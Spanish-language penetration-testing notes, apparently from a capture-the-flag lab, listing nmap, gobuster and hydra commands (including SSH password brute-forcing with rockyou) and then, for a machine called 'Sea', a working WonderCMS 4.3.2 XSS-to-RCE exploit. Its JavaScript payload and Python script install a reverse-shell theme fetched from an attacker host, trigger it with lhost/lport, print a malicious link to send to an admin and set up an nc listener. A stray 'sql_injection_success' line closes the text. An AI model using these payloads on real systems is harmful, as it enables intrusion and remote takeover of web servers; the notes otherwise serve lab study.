# COMANDOS UTILIZADOS DURANTE LA PRACTICA

## nmap

```bash
nmap -Pn -sV -sS -sC -T4 -p- <ip>
```

<mark style="color:blue;">`-Pn`</mark>` --> no hace ping asume que el host esta activo`

<mark style="color:blue;">`-sV`</mark>` --> Detecta las versiones de los servicios que están corriendo en los diferentes puertos`

<mark style="color:blue;">`-sS`</mark>` --> Realiza un escaneo SYN (rápido y sigiloso)`

<mark style="color:blue;">`-sC`</mark>` --> Ejecuta el script NSE (detección de vulnerabilidades)`

<mark style="color:blue;">`-T4`</mark>` --> Aumenta la velocidad del escaneo`

<mark style="color:blue;">`-p-`</mark>` --> escanea todos los puertos`

## gobuster

busqueda de directorios y archivos a fuerza bruta


```bash
gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


<mark style="color:blue;">`gobuster dir`</mark> : indica que ejecutara a gobuster en modo de búsqueda de archivos y directorios

## hydra

esta herramienta es usado para hacer ataques de fuerza bruta para buscar contraseñas

```bash
hydra 172.17.0.2 ssh -s 22 -l borazuwarah -P /usr/share/wordlists/rockyou.txt -f -I -t 64
```

Donde:

* <mark style="color:blue;">`ssh`</mark>  es el protocolo del servicio
* <mark style="color:blue;">`-s`</mark> 22 es el puerto que usara
* <mark style="color:blue;">`-l`</mark> es el nombre del usuario
* <mark style="color:blue;">`-P`</mark> es el archivo donde buscara las contraseñas
* <mark style="color:blue;">`-f`</mark> indica que la búsqueda termine con la primera coincidencia que encuentre
* <mark style="color:blue;">-I</mark>&#x20;
* <mark style="color:blue;">-t</mark> tareas el numero de tareas que ejecutara en paralelo

## Algunos comandos generales&#x20;

Este comando nos permite ver que permisos tenemos y que es lo que podemos ejecutar

```bash
sudo -l
```

## Herramientas de extraccion de datos a partir de una imagen



# UTILIDADES PARA MONTAR UN ENTORNO ORDENADO 

```bash
witch mkt | bat -l bash
```


#TTL
## Identificando maquinas a partir del TTL
si el `TTL` es al rededor de los 128 entonces es una maquina windows, pero si es 64 es Linux





## Maquina `Sea`
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
```

### Escaneo extenso a los puertos específicos

```bash
nmap -p<puertos> -sCV <IP> -oN targeted
```

##### resultados
```bash
cat targeted -l java
```
- Buscar en el navegador `OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 launchpad`  y observamos que estamos ante un ubuntu `Focal`
- Abrir el `/etc/hosts` en caso de encontrar un dominio
##### Listando tecnologías
```bash
whatweb <dominio>
```
##### Enumerando subdominios
```bash
gobuster vhost -u <dominio> -w <ruta diccionario> -t 200 --append-domain -r # se recomienda el diccionario de Seclist
```

- ruta diccionario `/usr/share/Seclist/Discovery/DNS/*`



```js
var url = "http://sea.htb/wondercms?page=index.php";

if (url.endsWith("/")) {

  url = url.slice(0, -1);

}

var urlWithoutLog = url.split("/").slice(0, -1).join("/");

var urlWithoutLogBase = new URL(urlWithoutLog).pathname;

var token = document.querySelectorAll('[name="token"]')[0].value;

var urlRev =

  "http://sea.htb/wondercms/?installModule=http://10.10.14.51:8000/revshell-main.zip&directoryName=violet&type=themes&token=" +

  token;

var xhr3 = new XMLHttpRequest();

xhr3.withCredentials = true;

xhr3.open("GET", urlRev);

xhr3.send();

xhr3.onload = function () {

  if (xhr3.status == 200) {

    var xhr4 = new XMLHttpRequest();

    xhr4.withCredentials = true;

    xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");

    xhr4.send();

    xhr4.onload = function () {

      if (xhr4.status == 200) {

        var ip = "10.10.14.51";

        var port = "1234";

        var xhr5 = new XMLHttpRequest();

        xhr5.withCredentials = true;

        xhr5.open(

          "GET",

          urlWithoutLogBase +

            "/themes/revshell-main/rev.php?lhost=" +

            ip +

            "&lport=" +

            port

        );

        xhr5.send();

      }

    };

  }

};
```


```python
# Author: prodigiousMind

# Exploit: Wondercms 4.3.2 XSS to RCE

  
  

import sys

import requests

import os

import bs4

  

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")

else:

  data = '''

var url = "'''+str(sys.argv[1])+'''";

if (url.endsWith("/")) {

 url = url.slice(0, -1);

}

var urlWithoutLog = url.split("/").slice(0, -1).join("/");

var urlWithoutLogBase = new URL(urlWithoutLog).pathname;

var token = document.querySelectorAll('[name="token"]')[0].value;

var urlRev = "http://sea.htb/wondercms/?installModule=http://{your ip}:8000/revshell-main.zip&directoryName=violet&type=themes&token=" + token;

var xhr3 = new XMLHttpRequest();

xhr3.withCredentials = true;

xhr3.open("GET", urlRev);

xhr3.send();

xhr3.onload = function() {

 if (xhr3.status == 200) {

   var xhr4 = new XMLHttpRequest();

   xhr4.withCredentials = true;

   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");

   xhr4.send();

   xhr4.onload = function() {

     if (xhr4.status == 200) {

       var ip = "'''+str(sys.argv[2])+'''";

       var port = "'''+str(sys.argv[3])+'''";

       var xhr5 = new XMLHttpRequest();

       xhr5.withCredentials = true;

       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);

       xhr5.send();

     }

   };

 }

};

'''

  try:

    open("xss.js","w").write(data)

    print("[+] xss.js is created")

    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))

    print("----------------------------\n")

    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""

    XSSlink = XSSlink.strip(" ")

    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)

    print("----------------------------\n")

  

    print("\nstarting HTTP server to allow the access to xss.js")

    os.system("python3 -m http.server\n")

  except: print(data,"\n","//write this to a file")
```


sql_injection_success